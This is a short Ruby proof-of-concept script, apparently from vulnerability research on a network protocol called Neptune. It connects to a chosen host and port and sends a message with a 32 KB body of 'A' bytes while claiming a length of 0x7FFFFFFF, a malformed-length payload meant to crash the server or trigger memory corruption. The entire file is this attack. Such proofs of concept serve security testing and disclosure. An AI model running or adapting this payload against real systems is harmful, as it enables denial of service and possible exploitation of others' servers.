# Encoding: ASCII-8BIT

require_relative './libneptune'

def usage
  puts "Usage: #{ $0 } <host> [port]"
  puts
  puts "Eg:"
  puts
  puts "#{ $0 } 10.0.0.198 31438"
  exit
end

HOST = ARGV[0] || usage()
PORT = ARGV[1] || "31438"

# Connect to the server
connection = LibNeptune::new(HOST, PORT)

connection.send(
  body_override: "A" * 0x8000,
  body_length_override: 0x7FFFFFFF,
)

connection.close()
